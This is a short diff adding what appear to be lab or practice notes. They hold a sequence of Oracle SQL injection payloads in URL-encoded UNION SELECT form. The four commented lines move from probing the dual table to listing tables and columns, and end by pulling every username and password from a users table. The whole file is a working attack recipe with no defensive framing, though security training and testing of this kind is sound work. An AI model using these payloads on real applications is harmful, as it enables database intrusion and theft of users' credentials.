@@ -1,0 +1,7 @@
+'+UNION+SELECT+'abc','def'+FROM+dual-- # find the entries from the dual table 
+
+'+UNION+SELECT+table_name,NULL+FROM+all_tables-- # select the table_name 
+
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- # select all the entries from the table 
+
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--  # select all username and password from the table.
